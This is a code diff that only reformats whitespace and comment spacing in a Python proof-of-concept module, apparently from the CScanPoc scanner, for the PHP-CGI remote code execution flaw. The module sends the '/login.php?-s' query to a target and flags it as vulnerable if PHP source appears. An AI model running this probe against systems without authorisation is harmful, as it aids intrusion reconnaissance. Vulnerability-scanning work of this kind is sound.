@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHP_0004'  # 平台漏洞编号，留空
     name = 'PHP-CGI 远程代码执行'  # 漏洞名称
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'PHP'  # 漏洞应用名称
     product_version = 'php < 5.3.12 or php < 5.4.2'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '805d4e1b-5f53-4a70-9fde-fcc5bcc47b48'
     author = '47bwy'  # POC编写者
@@ -37,11 +39,11 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             payload = '/login.php?-s'
-            url = self.target +  payload
-            code, head,res, errcode, _ = hh.http(url)
+            url = self.target + payload
+            code, head, res, errcode, _ = hh.http(url)
 
             if '$_SERVER' in res and '$_POST' in res and 'php' in res:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
